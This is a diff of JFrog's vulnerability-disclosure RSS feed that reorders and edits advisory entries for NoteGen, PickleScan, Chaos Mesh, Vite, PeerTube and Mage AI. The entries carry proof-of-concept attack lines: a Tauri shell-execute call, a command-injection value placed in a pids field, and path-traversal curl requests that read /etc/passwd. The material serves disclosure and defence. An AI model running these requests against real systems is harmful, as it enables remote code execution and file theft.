@@ -4,7 +4,7 @@
         <title>JFrog Security Vulnerabilities</title>
         <link>https://research.jfrog.com/</link>
         <description>Latest vulnerability disclosures discovered by JFrog Security Research.</description>
-        <lastBuildDate>Thu, 27 Aug 2026 01:43:21 GMT</lastBuildDate>
+        <lastBuildDate>Fri, 28 Aug 2026 03:04:44 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Gridsome Feed Plugin</generator>
         <language>en</language>
@@ -221,74 +221,6 @@ https://github.com/MoonshotAI/kimi-code/releases/tag/%40moonshot-ai%2Fkimi-code%
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-arbitrary-os-command-execution-via-tauri-shell-allow-execute-cve-2026-17497/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-arbitrary-os-command-execution-via-tauri-shell-allow-execute-cve-2026-17497/</guid>
-            <pubDate>Sun, 26 Jul 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2026-17497, HIGH, NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python
-
-
-## Component
-
-note-gen (NoteGen)
-
-## Affected versions
-
-< 0.32.0
-
-## Description
-
-NoteGen before 0.32.0 grants the Tauri shell plugin shell:allow-execute capability for bash, python, and python3 with arbitrary arguments in the default desktop capabilities. JavaScript running in the application webview can therefore invoke plugin:shell|execute to run attacker-controlled operating system commands with the privileges of the NoteGen process. In combination with script execution in the webview, for example via chat XSS (CVE-2026-17496), this enables full remote code execution on the user's machine.
-
-## PoC
-
-<br>
-
-**Step 1 - Obtain JavaScript execution in the NoteGen webview**
-
-<br>
-
-Use chat XSS (CVE-2026-17496) or another webview script sink so attacker JavaScript runs inside NoteGen < 0.32.0 on a default installation.
-
-<br>
-
-**Step 2 - Invoke the Tauri shell execute API**
-
-<br>
-
-From the webview, call:
-
-```javascript
-window.__TAURI__.core.invoke('plugin:shell|execute', {
-  program: 'bash',
-  args: ['-c', 'open -a Calculator'],
-  options: { cwd: null, env: null, encoding: 'utf-8' }
-});
-```
-
-<br>
-
-**Step 3 - Verify OS command execution**
-
-<br>
-
-Expected result: Calculator opens as the NoteGen user, proving arbitrary OS command execution via bash -c. The same path can read local files and exfiltrate them to an attacker-controlled server.
-
-## Vulnerability Mitigations
-
-Upgrade to NoteGen 0.32.0 or later. The fix removes shell:allow-execute entries that permitted bash, python, and python3 with attacker-controlled arguments from the default Tauri capabilities, closing the webview-to-OS command execution path.
-
-## References
-https://github.com/advisories/GHSA-r5ff-hq22-rhgv
-https://github.com/codexu/note-gen/commit/00064a4a8ec4177d51094ffb3e15bf0758009c1f
-https://github.com/codexu/note-gen/releases/tag/note-gen-v0.32.0
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[NoteGen is vulnerable to Chat Preview XSS via Unsanitized AI/Skill HTML Rendering]]></title>
             <link>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-chat-preview-xss-via-unsanitized-ai-skill-html-rendering-cve-2026-17496/</link>
             <guid>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-chat-preview-xss-via-unsanitized-ai-skill-html-rendering-cve-2026-17496/</guid>
@@ -366,6 +298,74 @@ Upgrade to NoteGen 0.32.0 or later. The fix replaces unsanitized markdown-it HTM
 ## References
 https://github.com/advisories/GHSA-gwhc-vprp-gfcg
 https://github.com/codexu/note-gen/commit/ae3ba948c41d8a74b4a20f4c6f26fcdda2002298
+https://github.com/codexu/note-gen/releases/tag/note-gen-v0.32.0
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-arbitrary-os-command-execution-via-tauri-shell-allow-execute-cve-2026-17497/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-arbitrary-os-command-execution-via-tauri-shell-allow-execute-cve-2026-17497/</guid>
+            <pubDate>Sun, 26 Jul 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-17497, HIGH, NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python
+
+
+## Component
+
+note-gen (NoteGen)
+
+## Affected versions
+
+< 0.32.0
+
+## Description
+
+NoteGen before 0.32.0 grants the Tauri shell plugin shell:allow-execute capability for bash, python, and python3 with arbitrary arguments in the default desktop capabilities. JavaScript running in the application webview can therefore invoke plugin:shell|execute to run attacker-controlled operating system commands with the privileges of the NoteGen process. In combination with script execution in the webview, for example via chat XSS (CVE-2026-17496), this enables full remote code execution on the user's machine.
+
+## PoC
+
+<br>
+
+**Step 1 - Obtain JavaScript execution in the NoteGen webview**
+
+<br>
+
+Use chat XSS (CVE-2026-17496) or another webview script sink so attacker JavaScript runs inside NoteGen < 0.32.0 on a default installation.
+
+<br>
+
+**Step 2 - Invoke the Tauri shell execute API**
+
+<br>
+
+From the webview, call:
+
+```javascript
+window.__TAURI__.core.invoke('plugin:shell|execute', {
+  program: 'bash',
+  args: ['-c', 'open -a Calculator'],
+  options: { cwd: null, env: null, encoding: 'utf-8' }
+});
+```
+
+<br>
+
+**Step 3 - Verify OS command execution**
+
+<br>
+
+Expected result: Calculator opens as the NoteGen user, proving arbitrary OS command execution via bash -c. The same path can read local files and exfiltrate them to an attacker-controlled server.
+
+## Vulnerability Mitigations
+
+Upgrade to NoteGen 0.32.0 or later. The fix removes shell:allow-execute entries that permitted bash, python, and python3 with attacker-controlled arguments from the default Tauri capabilities, closing the webview-to-OS command execution path.
+
+## References
+https://github.com/advisories/GHSA-r5ff-hq22-rhgv
+https://github.com/codexu/note-gen/commit/00064a4a8ec4177d51094ffb3e15bf0758009c1f
 https://github.com/codexu/note-gen/releases/tag/note-gen-v0.32.0
 ]]></content:encoded>
         </item>
@@ -1419,6 +1419,56 @@ No mitigations are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[PickleScan Bypass via ZIP file bad CRC]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10156/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10156/</guid>
+            <pubDate>Sun, 21 Sep 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[A bad CRC in a ZIP archive causes PickleScan to fail, allowing malicious pickle files within the archive to evade detection.]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+An Improper Handling of Exceptional Conditions vulnerability in the ZIP archive scanning component of mmaitre314 picklescan allows a remote attacker to bypass security scans. This is achieved by crafting a ZIP archive containing a file with a bad Cyclic Redundancy Check (CRC), which causes the scanner to halt and fail to analyze the contents for malicious pickle files. When the file incorrectly considered safe is loaded, it can lead to the execution of malicious code.
+
+
+## Component
+
+[picklescan](https://pypi.org/project/picklescan/)
+
+## Affected versions
+
+( , 0.0.31)
+
+## Description
+
+The vulnerability stems from how PickleScan handles ZIP archives. It uses Python's standard `zipfile` module, which raises an exception when it encounters a file with a CRC mismatch. PickleScan does not handle this exception gracefully; it halts the scan instead of attempting to process other valid files within the archive. This behavior creates a security blind spot, as PyTorch may be configured to ignore CRC errors and load a model from the same corrupted archive, inadvertently executing a malicious pickle payload that PickleScan failed to detect.
+
+## PoC
+
+The following steps demonstrate the vulnerability using a public model with a known CRC error.
+
+```bash
+# 1. Download a Pytorch model known to have a bad CRC.
+wget https://huggingface.co/jinaai/jina-embeddings-v2-base-en/resolve/main/pytorch_model.bin?download=true -O pytorch_model.bin
+
+# 2. Attempt to scan the corrupted ZIP file with PickleScan.
+picklescan -p pytorch_model.bin
+
+# Observed Result: PickleScan returns an error about a bad ZIP file and does not scan any content within the archive.
+
+# Expected Result: PickleScan should warn about the CRC error but still attempt to scan accessible files within the archive for threats.
+```
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+## References
+
+[GHSA](https://github.com/advisories/GHSA-mjqp-26hc-grxg)
+[NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-10156)
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[PickleScan Bypass via File Extension Mismatch]]></title>
             <link>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10155/</link>
             <guid>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10155/</guid>
@@ -1469,56 +1519,6 @@ No mitigations are supplied for this issue
 
 [GHSA](https://github.com/advisories/GHSA-jgw4-cr84-mqxg)
 [NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-10155)
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[PickleScan Bypass via ZIP file bad CRC]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10156/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10156/</guid>
-            <pubDate>Sun, 21 Sep 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[A bad CRC in a ZIP archive causes PickleScan to fail, allowing malicious pickle files within the archive to evade detection.]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-An Improper Handling of Exceptional Conditions vulnerability in the ZIP archive scanning component of mmaitre314 picklescan allows a remote attacker to bypass security scans. This is achieved by crafting a ZIP archive containing a file with a bad Cyclic Redundancy Check (CRC), which causes the scanner to halt and fail to analyze the contents for malicious pickle files. When the file incorrectly considered safe is loaded, it can lead to the execution of malicious code.
-
-
-## Component
-
-[picklescan](https://pypi.org/project/picklescan/)
-
-## Affected versions
-
-( , 0.0.31)
-
-## Description
-
-The vulnerability stems from how PickleScan handles ZIP archives. It uses Python's standard `zipfile` module, which raises an exception when it encounters a file with a CRC mismatch. PickleScan does not handle this exception gracefully; it halts the scan instead of attempting to process other valid files within the archive. This behavior creates a security blind spot, as PyTorch may be configured to ignore CRC errors and load a model from the same corrupted archive, inadvertently executing a malicious pickle payload that PickleScan failed to detect.
-
-## PoC
-
-The following steps demonstrate the vulnerability using a public model with a known CRC error.
-
-```bash
-# 1. Download a Pytorch model known to have a bad CRC.
-wget https://huggingface.co/jinaai/jina-embeddings-v2-base-en/resolve/main/pytorch_model.bin?download=true -O pytorch_model.bin
-
-# 2. Attempt to scan the corrupted ZIP file with PickleScan.
-picklescan -p pytorch_model.bin
-
-# Observed Result: PickleScan returns an error about a bad ZIP file and does not scan any content within the archive.
-
-# Expected Result: PickleScan should warn about the CRC error but still attempt to scan accessible files within the archive for threats.
-```
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-## References
-
-[GHSA](https://github.com/advisories/GHSA-mjqp-26hc-grxg)
-[NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-10156)
 ]]></content:encoded>
         </item>
         <item>
@@ -1605,59 +1605,6 @@ curl -X POST http://10.111.136.129:10082/query -H 'Content-Type: application/jso
   }'
 
 ```
-
-## Vulnerability Mitigations
-
-If upgrading Chaos-Mesh to the fixed version is not possible, re-deploy the Helm chart and disable the **chaosctl** tool and port:
-
-```shell
-helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --set enableCtrlServer=false
-```
-
-
-
-## References
-
-[Fix PR](https://github.com/chaos-mesh/chaos-mesh/pull/4702)
-
-[JFrog Technical Blog](https://jfrog.com/blog/chaotic-deputy-critical-vulnerabilities-in-chaos-mesh-lead-to-kubernetes-cluster-takeover)
-
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[Chaos Mesh killProcesses command injection]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-killprocesses-jfsa-2025-001449535/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-killprocesses-jfsa-2025-001449535/</guid>
-            <pubDate>Mon, 15 Sep 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-59360, CRITICAL, OS command injection in Chaos Mesh via the killProcesses mutation]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-OS command injection in Chaos Mesh via the killProcesses mutation
-
-## Component
-
-github.com/chaos-mesh/chaos-mesh
-
-## Affected versions
-
-(,2.7.2]
-
-## Description
-
-The killProcesses mutation in Chaos Controller Manager is vulnerable to OS command injection. In conjunction with CVE-2025-59358, this allows unauthenticated in-cluster attackers to perform remote code execution across the cluster.
-
-
-## PoC
-
-```shell
-{"query": "mutation KillProcessesInPod { 
-pod(ns: \"kube-system\", name: \"kube-proxy-9trk4\") { 
-killProcesses(pids: [\"1\","; touch /tmp/pwned;"]) { 
-pid command } } }
-```
-
-
 
 ## Vulnerability Mitigations
 
@@ -1786,6 +1733,107 @@ helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --se
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[Chaos Mesh killProcesses command injection]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-killprocesses-jfsa-2025-001449535/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-killprocesses-jfsa-2025-001449535/</guid>
+            <pubDate>Mon, 15 Sep 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2025-59360, CRITICAL, OS command injection in Chaos Mesh via the killProcesses mutation]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+OS command injection in Chaos Mesh via the killProcesses mutation
+
+## Component
+
+github.com/chaos-mesh/chaos-mesh
+
+## Affected versions
+
+(,2.7.2]
+
+## Description
+
+The killProcesses mutation in Chaos Controller Manager is vulnerable to OS command injection. In conjunction with CVE-2025-59358, this allows unauthenticated in-cluster attackers to perform remote code execution across the cluster.
+
+
+## PoC
+
+```shell
+{"query": "mutation KillProcessesInPod { 
+pod(ns: \"kube-system\", name: \"kube-proxy-9trk4\") { 
+killProcesses(pids: [\"1\","; touch /tmp/pwned;"]) { 
+pid command } } }
+```
+
+
+
+## Vulnerability Mitigations
+
+If upgrading Chaos-Mesh to the fixed version is not possible, re-deploy the Helm chart and disable the **chaosctl** tool and port:
+
+```shell
+helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --set enableCtrlServer=false
+```
+
+
+
+## References
+
+[Fix PR](https://github.com/chaos-mesh/chaos-mesh/pull/4702)
+
+[JFrog Technical Blog](https://jfrog.com/blog/chaotic-deputy-critical-vulnerabilities-in-chaos-mesh-lead-to-kubernetes-cluster-takeover)
+
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Vite arbitrary remote HTML file leak]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/vite-arbitrary-html-file-leak/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/vite-arbitrary-html-file-leak/</guid>
+            <pubDate>Mon, 15 Sep 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2025-58752, CRITICAL, Vite arbitrary remote HTML file leak]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Vite arbitrary remote HTML file leak
+
+## Component
+
+[vite](https://www.npmjs.com/package/vite)
+
+## Affected versions
+
+\>=7.1.0,<=7.1.4
+
+\>=7.0.0,<=7.0.6
+
+\>=6.0.0,<=6.3.5
+
+<=5.4.19
+
+## Description
+
+This vulnerability allows a remote attacker to leak any HTML file on the system.
+
+## PoC
+
+Assuming a vite server is running on localhost, and `somefile.html` exists at the root directory
+
+```shell
+curl -v --path-as-is 'http://localhost:5173/../../../../../../../../../../../somefile.html'
+```
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this vulnerability 
+
+
+
+## References
+
+[Fix PR](https://github.com/vitejs/vite/pull/20736)
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[Vite arbitrary restricted remote file leak]]></title>
             <link>https://research.jfrog.com/vulnerabilities/vite-arbitrary-private-file-leak/</link>
             <guid>https://research.jfrog.com/vulnerabilities/vite-arbitrary-private-file-leak/</guid>
@@ -1854,54 +1902,6 @@ No mitigations are supplied for this vulnerability
 ## References
 
 [Fix PR](https://github.com/vitejs/vite/pull/20735)
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[Vite arbitrary remote HTML file leak]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/vite-arbitrary-html-file-leak/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/vite-arbitrary-html-file-leak/</guid>
-            <pubDate>Mon, 15 Sep 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-58752, CRITICAL, Vite arbitrary remote HTML file leak]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Vite arbitrary remote HTML file leak
-
-## Component
-
-[vite](https://www.npmjs.com/package/vite)
-
-## Affected versions
-
-\>=7.1.0,<=7.1.4
-
-\>=7.0.0,<=7.0.6
-
-\>=6.0.0,<=6.3.5
-
-<=5.4.19
-
-## Description
-
-This vulnerability allows a remote attacker to leak any HTML file on the system.
-
-## PoC
-
-Assuming a vite server is running on localhost, and `somefile.html` exists at the root directory
-
-```shell
-curl -v --path-as-is 'http://localhost:5173/../../../../../../../../../../../somefile.html'
-```
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this vulnerability 
-
-
-
-## References
-
-[Fix PR](https://github.com/vitejs/vite/pull/20736)
 ]]></content:encoded>
         </item>
         <item>
@@ -2506,72 +2506,6 @@ It is recommended to switch to this maintained library if possible.
 [Original advisory](https://github.com/mholt/archives/issues/27)]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[PeerTube ActivityPub Playlist Creation Blind SSRF and DoS]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/peertube-activitypub-playlist-creation-blind-ssrf-dos/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/peertube-activitypub-playlist-creation-blind-ssrf-dos/</guid>
-            <pubDate>Mon, 14 Apr 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-32948 High severity. PeerTube ActivityPub Playlist Creation Blind SSRF and DoS]]></description>
-            <content:encoded><![CDATA[## Summary
-This vulnerability allows any attacker to cause the server to stop functioning, or in special cases send requests to arbitrary URLs (Blind SSRF).
-
-## Component
-
-[PeerTube](https://github.com/Chocobozzz/PeerTube)
-
-
-
-## Affected versions
-
-(, 7.1.0]
-
-
-
-## Description
-
-If federation is enabled (which is the default), PeerTube listens for POST requests to the **/inbox** path. This path is used for receiving ActivityPub activities. One of the possible activities is the Create Activity, which creates different objects on the server. One of the objects that may be created is a playlist. Part of the parsing of playlist ActivityPub objects includes fetching the playlist elements. The function that gets the list of the playlist items to fetch is **fetchElementUrls**. It is called from **createOrUpdateVideoPlaylist**. Afterwards, the **rebuildVideoPlaylistElements** function is called, which in turn calls the **buildElementsDBAttributes**, that calls **fetchRemotePlaylistElement** for each element. If the activity has an object instead of a string in the **url** field, the object will eventually be passed into the **got** library that is used by PeerTube, and will be parsed as additional options for the fetch. If the object will have valid options, they will be used by the **got** libraries. Such an example could be **{“enableUnixSockets”: true, “url”: “unix:/….”}**, which will cause the library to fetch from a UNIX socket (which won’t be protected by the **got-ssrf** library). Also the HTTP method can be changed, and some other options. In the case that the key isn’t valid, an error will be thrown, and will later be thrown again by the **_destroy** function in **got**, and will not be caught, causing the server to crash.
-
-It is also possible to trigger the attack by causing the server to actively fetch activities from a remote server. This can be done in different ways, for example by using the **/api/v1/search/video-channels** path, and passing the **search** argument with a URL that can be used for the attack. This can be done only if users have the ability to search remote URIs (**search.remote_uri** in the configuration), which by default is enabled for registered users.
-
-
-
-## PoC
-
-This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). We also assume that there are 2 existing users on the instance: the default root user and a low privileged user.
-
-
-
-1. First, using a browser, log in to the PeerTube instance with the low privileged user’s credentials, and use the inspection screen to copy the authorization token of the user.
-
-1. In a terminal, run the following command (you will need to install the **flask** package for python if it is not installed on the system):
-
-   ```
-   python malicious_rest_server.py
-   ```
-
-   This will start a server listening on port 1234.
-
-1. In another terminal, run the following command (insert the user token in the proper place):
-
-   ```
-   curl -v 'http://localhost:3000/api/v1/search/video-channels?search=http://localhost:1234/accounts/root_crash' -H 'Authorization: Bearer user_token'
-   ```
-
-   This technique is based on PeerTube’s search for channels. After fetching the outbox of a user, it will not be possible to ask for the same user again using this technique until the refresh interval will pass. This means that every time you want to run this curl command you should change something in the username (for example `http://localhost:1234/accounts/root1_crash` instead of `http://localhost:1234/accounts/root_crash`) .
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-
-
-## References
-
-[Fix release](https://github.com/Chocobozzz/PeerTube/releases/tag/v7.1.1)
-
-[PoC Materials](https://drive.google.com/file/d/1zmXFNutT4ACOJZGmxhU22nhu9Fbn4ui2/view?usp=drive_link)
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[PeerTube ActivityPub Crawl Infinite Loop DoS]]></title>
             <link>https://research.jfrog.com/vulnerabilities/peertube-activitypub-crawl-dos/</link>
             <guid>https://research.jfrog.com/vulnerabilities/peertube-activitypub-crawl-dos/</guid>
@@ -3014,6 +2948,72 @@ No mitigations are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[PeerTube ActivityPub Playlist Creation Blind SSRF and DoS]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/peertube-activitypub-playlist-creation-blind-ssrf-dos/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/peertube-activitypub-playlist-creation-blind-ssrf-dos/</guid>
+            <pubDate>Mon, 14 Apr 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2025-32948 High severity. PeerTube ActivityPub Playlist Creation Blind SSRF and DoS]]></description>
+            <content:encoded><![CDATA[## Summary
+This vulnerability allows any attacker to cause the server to stop functioning, or in special cases send requests to arbitrary URLs (Blind SSRF).
+
+## Component
+
+[PeerTube](https://github.com/Chocobozzz/PeerTube)
+
+
+
+## Affected versions
+
+(, 7.1.0]
+
+
+
+## Description
+
+If federation is enabled (which is the default), PeerTube listens for POST requests to the **/inbox** path. This path is used for receiving ActivityPub activities. One of the possible activities is the Create Activity, which creates different objects on the server. One of the objects that may be created is a playlist. Part of the parsing of playlist ActivityPub objects includes fetching the playlist elements. The function that gets the list of the playlist items to fetch is **fetchElementUrls**. It is called from **createOrUpdateVideoPlaylist**. Afterwards, the **rebuildVideoPlaylistElements** function is called, which in turn calls the **buildElementsDBAttributes**, that calls **fetchRemotePlaylistElement** for each element. If the activity has an object instead of a string in the **url** field, the object will eventually be passed into the **got** library that is used by PeerTube, and will be parsed as additional options for the fetch. If the object will have valid options, they will be used by the **got** libraries. Such an example could be **{“enableUnixSockets”: true, “url”: “unix:/….”}**, which will cause the library to fetch from a UNIX socket (which won’t be protected by the **got-ssrf** library). Also the HTTP method can be changed, and some other options. In the case that the key isn’t valid, an error will be thrown, and will later be thrown again by the **_destroy** function in **got**, and will not be caught, causing the server to crash.
+
+It is also possible to trigger the attack by causing the server to actively fetch activities from a remote server. This can be done in different ways, for example by using the **/api/v1/search/video-channels** path, and passing the **search** argument with a URL that can be used for the attack. This can be done only if users have the ability to search remote URIs (**search.remote_uri** in the configuration), which by default is enabled for registered users.
+
+
+
+## PoC
+
+This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). We also assume that there are 2 existing users on the instance: the default root user and a low privileged user.
+
+
+
+1. First, using a browser, log in to the PeerTube instance with the low privileged user’s credentials, and use the inspection screen to copy the authorization token of the user.
+
+1. In a terminal, run the following command (you will need to install the **flask** package for python if it is not installed on the system):
+
+   ```
+   python malicious_rest_server.py
+   ```
+
+   This will start a server listening on port 1234.
+
+1. In another terminal, run the following command (insert the user token in the proper place):
+
+   ```
+   curl -v 'http://localhost:3000/api/v1/search/video-channels?search=http://localhost:1234/accounts/root_crash' -H 'Authorization: Bearer user_token'
+   ```
+
+   This technique is based on PeerTube’s search for channels. After fetching the outbox of a user, it will not be possible to ask for the same user again using this technique until the refresh interval will pass. This means that every time you want to run this curl command you should change something in the username (for example `http://localhost:1234/accounts/root1_crash` instead of `http://localhost:1234/accounts/root_crash`) .
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+
+
+## References
+
+[Fix release](https://github.com/Chocobozzz/PeerTube/releases/tag/v7.1.1)
+
+[PoC Materials](https://drive.google.com/file/d/1zmXFNutT4ACOJZGmxhU22nhu9Fbn4ui2/view?usp=drive_link)
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[LemmyNet activitypub_federation WebFinger Blind SSRF]]></title>
             <link>https://research.jfrog.com/vulnerabilities/lemmynet-activitypub-federation-blind-ssrf/</link>
             <guid>https://research.jfrog.com/vulnerabilities/lemmynet-activitypub-federation-blind-ssrf/</guid>
@@ -3319,15 +3319,15 @@ with -
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[Mage AI git content request remote arbitrary file leak]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/mage-ai-git-content-request-remote-arbitrary-file-leak-jfsa-2024-001039604/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/mage-ai-git-content-request-remote-arbitrary-file-leak-jfsa-2024-001039604/</guid>
+            <title><![CDATA[Mage AI deleted users RCE]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/mage-ai-deleted-users-rce-jfsa-2024-001039602/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/mage-ai-deleted-users-rce-jfsa-2024-001039602/</guid>
             <pubDate>Fri, 23 Aug 2024 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2024-45189, MEDIUM, Mage AI git content request remote arbitrary file leak]]></description>
+            <description><![CDATA[CVE-2024-45187, HIGH, Mage AI deleted users RCE]]></description>
             <content:encoded><![CDATA[
 ## Summary
 
-Mage AI git content request remote arbitrary file leak
+Mage AI allows deleted users to use the terminal server with admin access, leading to remote code execution
 
 ## Component
 
@@ -3339,17 +3339,11 @@ mage-ai
 
 ## Description
 
-Mage AI allows remote users with the "Viewer" role to leak arbitrary files from the Mage server due to a path traversal in the "Git Content" request
+Guest users in the Mage AI framework that remain logged in after their accounts are deleted, are mistakenly given high privileges and specifically given access to remotely execute arbitrary code through the Mage AI terminal server
 
 ## PoC
 
-```bash
-curl -X GET
-'http://localhost:6789/api/git_file/..%2F..%2Fetc%2Fpasswd?api_key=<USER API KEY>' -H 'Authorization: Bearer
-<USER TOKEN>'
-```
-
-
+No PoC is supplied for this issue
 
 ## Vulnerability Mitigations
 
@@ -3362,15 +3356,15 @@ No references are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[Mage AI pipeline interaction request remote arbitrary file leak]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/mage-ai-pipeline-interaction-request-remote-arbitrary-file-leak-jfsa-2024-001039605/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/mage-ai-pipeline-interaction-request-remote-arbitrary-file-leak-jfsa-2024-001039605/</guid>
+            <title><![CDATA[Mage AI file content request remote arbitrary file leak]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/mage-ai-file-content-request-remote-arbitrary-file-leak-jfsa-2024-001039603/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/mage-ai-file-content-request-remote-arbitrary-file-leak-jfsa-2024-001039603/</guid>
             <pubDate>Fri, 23 Aug 2024 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2024-45190, MEDIUM, Mage AI pipeline interaction request remote arbitrary file leak]]></description>
+            <description><![CDATA[CVE-2024-45188, MEDIUM, Mage AI file content request remote arbitrary file leak]]></description>
             <content:encoded><![CDATA[
 ## Summary
 
-Mage AI pipeline interaction request remote arbitrary file leak
+Mage AI file content request remote arbitrary file leak
 
 ## Component
 
@@ -3382,14 +3376,14 @@ mage-ai
 
 ## Description
 
-Mage AI allows remote users with the "Viewer" role to leak arbitrary files from the Mage server due to a path traversal in the "Pipeline Interaction" request
+Mage AI allows remote users with the "Viewer" role to leak arbitrary files from the Mage server due to a path traversal in the "File Content" request
 
 ## PoC
 
 ```bash
 curl -X GET
-'http://localhost:6789/api/pipelines/example_pipeline/interaction/..%2F..%2F..%2
-F..%2Fetc%2Fpasswd?api_key=<USER API KEY>' -H 'Authorization: Bearer
+'http://localhost:6789/api/file_contents/..%2F..%2F..%2Fetc%2Fpasswd?api_key=
+<USER API KEY>' -H 'Authorization: Bearer
 <USER TOKEN>'
 ```
 
